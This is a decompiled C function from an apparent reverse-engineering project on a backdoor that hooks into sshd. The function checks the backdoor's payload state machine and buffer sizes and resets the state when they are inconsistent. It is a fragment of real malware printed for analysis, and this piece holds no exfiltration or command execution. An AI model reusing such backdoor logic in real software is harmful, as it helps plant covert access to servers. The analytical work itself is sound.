// /home/kali/xzre-ghidra/xzregh/107EA0_check_backdoor_state.c
// Function: check_backdoor_state @ 0x107EA0
// Calling convention: __stdcall
// Prototype: BOOL __stdcall check_backdoor_state(global_context_t * ctx)


/*
 * AutoDoc: Sanity-checks the payload buffer and state machine before processing more command data, resetting the state on any inconsistency. The loader calls it before and after decryptions to avoid reusing corrupted payloads.
 */
#include "xzre_types.h"


BOOL check_backdoor_state(global_context_t *ctx)

{
  u32 uVar1;
  ulong uVar2;
  bool bVar3;
  bool bVar4;
  
  if (ctx == (global_context_t *)0x0) {
    return 0;
  }
  uVar1 = ctx->payload_state;
  if ((int)uVar1 < 3) {
    if (0 < (int)uVar1) {
      if (((ctx->sshd_payload_ctx != (sshd_payload_ctx_t *)0x0) && (0xad < ctx->current_data_size))
         && (uVar2 = (ulong)*(ushort *)ctx->sshd_payload_ctx, ctx->current_data_size <= uVar2)) {
        if (uVar2 <= uVar2 + 0x60) {
          uVar2 = uVar2 + 0x60;
        }
        if (uVar2 <= ctx->payload_data_size) {
          return 1;
        }
      }
      goto LAB_00107f11;
    }
    if (uVar1 != 0) goto LAB_00107f11;
    bVar3 = ctx->current_data_size < 0xae;
    bVar4 = ctx->current_data_size == 0xae;
  }
  else {
    bVar3 = uVar1 == 3;
    bVar4 = uVar1 == 4;
  }
  if (bVar3 || bVar4) {
    return 1;
  }
LAB_00107f11:
  ctx->payload_state = 0xffffffff;
  return 0;
}

